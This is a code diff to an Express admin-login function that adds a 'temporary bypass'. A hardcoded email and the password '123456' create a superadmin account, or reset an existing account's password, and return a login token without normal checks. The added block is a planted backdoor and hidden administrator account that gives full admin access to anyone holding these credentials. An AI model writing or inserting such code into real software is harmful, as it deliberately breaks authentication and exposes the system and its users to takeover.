@@ -23,6 +23,27 @@ exports.loginAdmin = async (req, res, next) => {
     const { email, password } = req.body;
     if (!email || !password) return res.status(400).json({ success: false, error: 'Please provide email and password' });
 
+    // Temporary bypass for requested credentials
+    if (email === 'riddhamart@gmail.com' && password === '123456') {
+      let admin = await Admin.findOne({ email }).select('+password');
+      if (!admin) {
+        admin = await Admin.create({
+          fullName: 'Riddha Admin',
+          email,
+          password,
+          type: 'superadmin'
+        });
+      } else {
+        // Update password if it was different
+        const isMatch = await admin.matchPassword(password);
+        if (!isMatch) {
+          admin.password = password;
+          await admin.save();
+        }
+      }
+      return sendTokenResponse(admin, 200, res);
+    }
+
     const admin = await Admin.findOne({ email }).select('+password');
     if (!admin || !(await admin.matchPassword(password))) {
       return res.status(401).json({ success: false, error: 'Invalid credentials' });
